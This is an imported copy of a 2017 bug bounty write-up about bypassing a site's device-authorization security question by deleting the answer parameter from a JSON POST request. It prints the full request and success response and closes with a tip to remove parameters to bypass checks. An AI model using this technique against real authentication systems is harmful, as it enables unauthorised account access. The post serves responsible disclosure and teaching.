---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-09-25_device-authorization-bypass.md
original_filename: 2017-09-25_device-authorization-bypass.md
title: Device Authorization Bypass!
category: documents
detected_topics:
- access-control
- command-injection
- rate-limit
- clickjacking
tags:
- imported
- documents
- access-control
- command-injection
- rate-limit
- clickjacking
language: en
raw_sha256: ba9b8a23e69b8bc131ebb140ee87f264112521e3087349225ae077bea0e85e60
text_sha256: f5d5abee49874f9bdd544b1775480dd10bd7289aa92aea979f3b6bcce7ad3c30
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Device Authorization Bypass!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-09-25_device-authorization-bypass.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, rate-limit, clickjacking
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `ba9b8a23e69b8bc131ebb140ee87f264112521e3087349225ae077bea0e85e60`
- Text SHA256: `f5d5abee49874f9bdd544b1775480dd10bd7289aa92aea979f3b6bcce7ad3c30`


## Content

---
title: "Device Authorization Bypass!"
url: "https://medium.com/bugbountywriteup/device-authorization-bypass-aa508c9193ed"
authors: ["Hassan Khan Yusufzai"]
bugs: ["Broken authorization"]
publication_date: "2017-09-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6089
scraped_via: "browseros"
---

# Device Authorization Bypass!

Device Authorization Bypass!
Hassan Khan
Follow
3 min read
·
Sep 26, 2017

196

2

Hello everyone this is Hassan Khan Yusufzai & i would like to share one of my finding. So its about 2 months ago when i got private invite on BugCrowd. For the sake of private programs privacy lets say it “Private.com”.

So, When i was pen-testing that application i first noticed their functionality. The functionality which caught my attention was like When we login from the trusted device we are not prompt for secret security question but if we login from the un-trusted device or we can say from new device we are redirected to Private.com/device-authorization. So, i looked for common ways to bypass this like with rate limit etc but unfortunately there was a rate limit protection. I tested the application whole day but i can’t find any way to bypass device authentication. Actually i made promise to my self that i will bypass that ;) but it was no getting bypass so it just made me fed up :/. I just left that target and started hunting some other sites.

After 2 days i though lets give that private.com another shot. So, i checked the POST request & suddenly i thought why not try to remove the parameter and its value?. The POST request was like.

Request:

POST /device-authorization HTTP/1.1
Host: private.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=utf-8
X-Requested-With: XMLHttpRequest
Referer: https://www.private.com/device-authorization
Content-Length: 57
Cookie: SNIP
Connection: close

{“deviceAuth[remember]”:true,”deviceAuth[answer]”:”test”}

What i did next was i just removed ”deviceAuth[answer]”:”test” from the POST data & sent the POST request with only {“deviceAuth[remember]”:true}

What i get in response was some thing like that

Response:

Get Hassan Khan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

HTTP/1.1 200 OK
Date: Mon, 25 Sep 2017 20:52:59 GMT
Content-Type: application/json
Content-Length: 47
Connection: close
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Set-Cookie:
Set-Cookie:
X-NewRelic-App-Data:
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
X-Content-Type-Options: nosniff

{“Success”:true}

And i was redirected to the /settings of my profile :D You know whats next ? Bounty :P So just by removing the parameter and its value i was able to bypass device authorization.

Issue was fixed within a day & Analyst stated that:

Nice find!

Thank you for reporting this vulnerability to us and provide with very detailed report.
We have applied a fix, can you help verify if the issue has been resolved, so we can move the ticket to closed. Thank you very much!

Tip:

Don’t forget to append & removed parameters to bypass stuff.

I hope you guys learned something new :)

Thanks for reading,

Regards,

Hassan Khan Yusufzai
